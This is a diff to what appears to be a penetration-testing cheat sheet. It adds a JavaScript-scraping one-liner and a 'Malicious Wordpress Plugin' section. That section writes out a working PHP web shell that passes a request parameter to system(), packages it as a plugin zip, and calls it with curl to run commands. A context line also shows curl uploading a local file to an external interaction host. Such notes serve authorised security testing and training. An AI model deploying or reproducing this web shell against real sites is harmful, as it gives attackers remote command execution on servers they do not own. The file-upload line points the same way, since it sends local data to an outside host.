@@ -78,7 +78,7 @@
 - [Websocket Request Smuggling](#websocket-request-smuggling)
 - [Wfuzz](#wfuzz)
 - [WhatWeb](#whatweb)
-- [Wordpress](#wordpress)
+- [WordPress](#wordpress)
 - [WPProbe](#wpprobe)
 - [WPScan](#wpscan)
 - [wrapwrap](#wrapwrap)
@@ -2768,6 +2768,20 @@ $ curl -F "out=@/PATH/TO/FILE/<FILE>.txt"  cdnx6mj2vtc0000m6shggg46ukoyyyyyb.oas
 ```
 
 ## JavaScript
+
+### JavaScript Script Scraping
+
+```console
+$ export URL='http://<RHOST>'
+```
+
+```console
+$ mkdir -p js
+```
+
+```console
+$ curl -sk "$URL/" | grep -Eoi 'src="[^"]+\.js[^"]*"' | cut -d'"' -f2 | sed -E "s#^//#https://#; s#^/#$URL/#" | sort -u | while read js; do out="js/$(echo "$js" | sed 's#[/:?&=]#_#g')"; echo "[+] $js -> $out"; curl -sk "$js" -o "$out"; done
+```
 
 ### JSFuck
 
@@ -6121,12 +6135,39 @@ $ wfuzz -c -z range,1-65535 --hh 0 -b "token=<TOKEN>" 'http://<RHOST>/api/status
 $ whatweb -v -a 3 <RHOST>
 ```
 
-## Wordpress
+## WordPress
 
 ### Config Path
 
 ```console
 /var/www/wordpress/wp-config.php
+```
+
+### Malicious Wordpress Plugin
+
+```console
+$ mkdir shell-plugin/
+```
+
+```console
+$ cat > shell-plugin/shell-plugin.php <<'EOF'
+<?php
+/*
+Plugin Name: Shell Plugin
+Version: 1.0
+*/
+if (isset($_REQUEST['c'])) {
+    system($_REQUEST['c']);
+}
+EOF
+```
+
+```console
+$ zip -r shell-plugin.zip shell-plugin
+```
+
+```console
+$ curl -sk 'http://<RHOST>/wp-content/plugins/shell-plugin/shell-plugin.php?c=id'
 ```
 
 ## WPProbe
